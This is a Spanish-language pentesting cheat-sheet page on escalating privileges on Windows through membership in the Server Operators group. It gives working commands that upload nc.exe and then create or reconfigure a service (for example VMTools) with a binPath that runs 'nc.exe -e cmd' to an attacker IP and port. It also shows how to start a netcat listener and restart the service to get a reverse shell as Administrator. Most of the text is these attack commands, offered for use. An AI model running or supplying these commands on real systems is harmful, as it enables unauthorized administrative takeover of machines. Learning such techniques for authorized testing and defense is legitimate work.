---
icon: server
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# A.D. Group Server Operators

Estando dentro de este grupo y pudiendo para y correr servicios del sistema se puede escalar privilegios de la siguiente manera...

Primero veremos en nuestro `host` donde esta el `nc.exe` para que sirva en `Windows`....

```shell
locate nc.exe
```

Info:

```
/usr/share/windows-resources/binaries/nc.exe
```

Nos copiamos ese `.exe` a nuestro directorio actual para pasarlo a la maquina `Windows`...

```shell
cp /usr/share/windows-resources/binaries/nc.exe .
```

Hacemos un `pwd` para ver en la ruta actual en la que estamos y en la que hemos llevado el archivo, en mi caso...

```
/home/kali/Desktop
```

Por lo que en la maquina `Windows` haremos lo siguiente para pasarnoslo...

```shell
upload /home/kali/Desktop/nc.exe
```

Una vez hecho esto ya estaria el `nc.exe` ya estaria en la maquina `Windows`...

Ahora lo que haremos sera arrancar un servicio ya que estamos en el grupo para poder hacerlo, de la siguiente manera haciendo una reverse shell y como lo esta ejecutando por asi decirlo el `administrador` conseguiriamos una shell como el mismo...

```shell
sc.exe create reverse binPath="C:\<PATH>\nc.exe -e cmd <IP> <PORT>"
```

Con esto lo que estamos haciendo es crear un servicio de que cuando se inicie cierto servicio arranque el `nc.exe` que se encuentra en ese `PATH` ejecutando el mismo una `Reverse Shell` con los siguientes paraemtros...

Ahora nos pondremos a la escucha...

```shell
nc -lvnp <PORT>
```

Pero si al crear eso nos pone `Access Denied` manipularemos un servicio que ya este creado de la siguiente manera...

Lo miraremos con `services` los servicios que estan abiertos y eligiendo uno de ellos le cambiaremos la configuracion de la siguiente manera...

```shell
sc.exe config <SERVICE_NAME> binPath="C:\<PATH>\nc.exe -e cmd <IP> <PORT>"
```

> EJEMPLO

```shell
sc.exe config VMTools binPath="C:\<PATH>\nc.exe -e cmd <IP> <PORT>"
```

A lo mejor no te deja con todos los servicios pero es ir probando hasta que te deje cambiarle la configuracion alguno de ellos...

Si encontramos uno que te deje cambiar la configuracion, haremos lo siguiente...

```shell
sc.exe stop <SERVICE_NAME>
```

```shell
sc.exe stop VMTools
```

Y ahora estaremos a la escucha...

```shell
nc -lvnp <PORT>
```

Ahora en la maquina `Windows` iniciamos el servicio para que se inicie la `Reverse Shell`...

```shell
sc.exe start <SERVICE_NAME>
```

```shell
sc.exe start VMTools
```

Y con esto ya habriamos conseguido una `Reverse Shell` como `Administrador` en la maquina `Windows`...

